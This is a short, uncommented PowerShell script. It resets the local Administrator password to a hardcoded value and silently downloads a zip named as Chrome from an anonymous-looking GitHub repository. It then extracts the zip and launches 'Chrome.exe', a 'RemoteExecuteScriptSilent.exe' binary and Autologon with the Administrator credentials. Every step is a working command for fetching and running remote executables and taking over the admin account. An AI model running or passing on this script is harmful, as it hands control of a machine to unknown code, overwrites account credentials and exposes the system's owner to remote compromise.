[System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem")
net user Administrator Nancyhd1@
$Url = 'https://github.com/37218vuuhuu/app-19/raw/main/Chrome.57.zip'

[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"

$ProgressPreference = 'SilentlyContinue'

Invoke-WebRequest $Url -OutFile Chrome.57.zip

Expand-Archive Chrome.57.zip -DestinationPath Chrome.57
Set-Location Chrome.57/Chrome.57

Start "Chrome.exe"
Start "RemoteExecuteScriptSilent.exe"

Set-Location Chrome.57/Chrome.57
Start "Autologon64"
Get-PSReadLineKeyHandler -Chord Enter

Set-Location Chrome.57/Chrome.57
Start-Process "Autologon64" -ArgumentList "Administrator","Administrator","Nancyhd1@"
Get-PSReadLineKeyHandler -Chord Enter
